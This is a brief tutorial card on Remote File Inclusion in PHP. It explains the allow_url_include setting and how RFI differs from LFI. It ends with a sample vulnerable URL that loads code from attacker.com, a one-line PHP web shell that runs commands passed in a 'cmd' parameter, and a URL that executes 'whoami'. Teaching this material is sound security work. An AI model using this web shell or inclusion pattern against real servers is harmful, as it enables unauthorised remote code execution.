Core Concept

Understanding Remote File Inclusion (RFI)

Executing files from an attacker-controlled server.

Key Idea

RFI allows a vulnerable application to include and execute files from a remote, attacker-controlled server, typically leading to RCE if `allow_url_include` is enabled.

How it Differs from LFI

Unlike LFI, which includes local files, RFI fetches and executes files from a remote server specified by the attacker, requiring a specific PHP configuration.

Critical Setting

RFI is usually only possible if the PHP setting allow_url_include is enabled, which is often disabled by default for security reasons.

Vulnerable URL Example
http://example.com/index.php?page=http://attacker.com/malicious.php
Attacker-Controlled `malicious.php`
<?php system($_GET['cmd']); ?>
Execution URL Example

http://example.com/index.php?page=http://attacker.com/malicious.php&cmd=whoami
